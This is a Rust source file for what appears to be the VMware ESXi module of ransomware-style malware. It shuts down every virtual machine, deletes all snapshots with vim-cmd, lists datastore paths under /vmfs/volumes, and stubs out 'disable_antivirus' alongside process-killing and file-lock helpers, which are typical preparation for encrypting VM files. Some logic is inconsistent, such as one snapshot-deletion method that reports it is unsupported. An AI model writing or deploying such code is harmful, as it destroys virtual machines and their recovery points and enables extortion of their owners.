use super::platform::{Platform, ProcessInfo, SystemInfo, PlatformType};
use super::linux::LinuxPlatform;
use std::path::Path;
use std::process::Command;

#[cfg(unix)]
pub struct ESXiPlatform {
    linux: LinuxPlatform,
}

#[cfg(unix)]
impl ESXiPlatform {
    pub fn new() -> Self {
        ESXiPlatform {
            linux: LinuxPlatform::new(),
        }
    }
    
    pub fn shutdown_all_vms(&self) -> Result<(), String> {
        println!("[ESXi] Shutting down all virtual machines...");
        
        let output = Command::new("vim-cmd")
            .args(["vmsvc/getallvms"])
            .output();
        
        match output {
            Ok(result) if result.status.success() => {
                let output_str = String::from_utf8_lossy(&result.stdout);
                
                for line in output_str.lines() {
                    if line.contains("Vmid") {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            let vm_id = parts[1];
                            println!("[ESXi] Shutting down VM ID: {}", vm_id);
                            
                            let shutdown_result = Command::new("vim-cmd")
                                .args(["vmsvc/power.shutdown", vm_id])
                                .output();
                            
                            match shutdown_result {
                                Ok(res) if res.status.success() => {
                                    println!("[ESXi] VM {} shutdown initiated", vm_id);
                                }
                                Ok(res) => {
                                    eprintln!("[ESXi] Failed to shutdown VM {}: {}", 
                                        vm_id, String::from_utf8_lossy(&res.stderr));
                                }
                                Err(e) => {
                                    eprintln!("[ESXi] Error shutting down VM {}: {}", vm_id, e);
                                }
                            }
                        }
                    }
                }
                
                println!("[ESXi] All VMs shutdown initiated");
                Ok(())
            }
            Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
            Err(e) => Err(e.to_string()),
        }
    }
    
    pub fn get_vm_paths(&self) -> Vec<String> {
        let mut vm_paths = Vec::new();
        
        let output = Command::new("vim-cmd")
            .args(["vmsvc/getallvms"])
            .output();
        
        if let Ok(result) = output {
            if result.status.success() {
                let output_str = String::from_utf8_lossy(&result.stdout);
                
                for line in output_str.lines() {
                    if line.contains(".vmx") {
                        if let Some(start) = line.find('[') {
                            if let Some(end) = line.find(']') {
                                let datastore = &line[start+1..end];
                                vm_paths.push(format!("/vmfs/volumes/{}", datastore));
                            }
                        }
                    }
                }
            }
        }
        
        vm_paths
    }
    
    pub fn delete_all_snapshots(&self) -> Result<(), String> {
        println!("[ESXi] Deleting all snapshots from all virtual machines...");
        
        let output = Command::new("vim-cmd")
            .args(["vmsvc/getallvms"])
            .output();
        
        match output {
            Ok(result) if result.status.success() => {
                let output_str = String::from_utf8_lossy(&result.stdout);
                let mut deleted_count = 0;
                
                for line in output_str.lines() {
                    if line.contains("Vmid") {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            let vm_id = parts[1];
                            println!("[ESXi] Deleting snapshots for VM ID: {}", vm_id);
                            
                            let delete_result = Command::new("vim-cmd")
                                .args(["vmsvc/snapshot.removeall", vm_id])
                                .output();
                            
                            match delete_result {
                                Ok(res) if res.status.success() => {
                                    println!("[ESXi] Successfully deleted snapshots for VM {}", vm_id);
                                    deleted_count += 1;
                                }
                                Ok(res) => {
                                    let stderr = String::from_utf8_lossy(&res.stderr);
                                    if stderr.contains("No snapshots") || stderr.contains("not found") {
                                        println!("[ESXi] VM {} has no snapshots to delete", vm_id);
                                    } else {
                                        eprintln!("[ESXi] Failed to delete snapshots for VM {}: {}", 
                                            vm_id, stderr);
                                    }
                                }
                                Err(e) => {
                                    eprintln!("[ESXi] Error deleting snapshots for VM {}: {}", vm_id, e);
                                }
                            }
                        }
                    }
                }
                
                println!("[ESXi] Snapshot deletion completed for {} VMs", deleted_count);
                Ok(())
            }
            Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
            Err(e) => Err(e.to_string()),
        }
    }
}

#[cfg(unix)]
impl Platform for ESXiPlatform {
    fn platform_name(&self) -> &'static str {
        "VMware ESXi"
    }
    
    fn file_lock_check(&self, path: &Path) -> bool {
        self.linux.file_lock_check(path)
    }
    
    fn get_process_list(&self) -> Vec<ProcessInfo> {
        self.linux.get_process_list()
    }
    
    fn terminate_process(&self, pid: u32) -> bool {
        self.linux.terminate_process(pid)
    }
    
    fn get_network_drives(&self) -> Vec<String> {
        let mut drives = self.linux.get_network_drives();
        
        if let Ok(content) = std::fs::read_to_string("/etc/vmware/hostd/config.xml") {
            for line in content.lines() {
                if line.contains("<datastore>") {
                    if let Some(start) = line.find(">") {
                        if let Some(end) = line.find("</datastore>") {
                            let ds = &line[start+1..end];
                            drives.push(format!("/vmfs/volumes/{}", ds));
                        }
                    }
                }
            }
        }
        
        drives
    }
    
    fn is_virtual_machine(&self) -> bool {
        true
    }
    
    fn get_system_info(&self) -> SystemInfo {
        let mut info = self.linux.get_system_info();
        info.os_name = "VMware ESXi".to_string();
        info.platform_type = PlatformType::ESXi;
        info
    }
    
    fn disable_antivirus(&self) -> Result<(), String> {
        Ok(())
    }
    
    fn enable_antivirus(&self) -> Result<(), String> {
        Ok(())
    }
    
    fn create_snapshot(&self, path: &Path) -> Result<(), String> {
        use std::process::Command;
        
        let output = Command::new("vim-cmd")
            .args(["vmsvc/get.snapshot", path.to_str().unwrap()])
            .output();
        
        match output {
            Ok(result) if result.status.success() => Ok(()),
            Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
            Err(e) => Err(e.to_string()),
        }
    }
    
    fn restore_snapshot(&self, path: &Path) -> Result<(), String> {
        use std::process::Command;
        
        let output = Command::new("vim-cmd")
            .args(["vmsvc/revert", path.to_str().unwrap()])
            .output();
        
        match output {
            Ok(result) if result.status.success() => Ok(()),
            Ok(result) => Err(String::from_utf8_lossy(&result.stderr).to_string()),
            Err(e) => Err(e.to_string()),
        }
    }
    
    fn delete_all_snapshots(&self) -> Result<(), String> {
        Err("Snapshot deletion not supported on ESXi".to_string())
    }
}
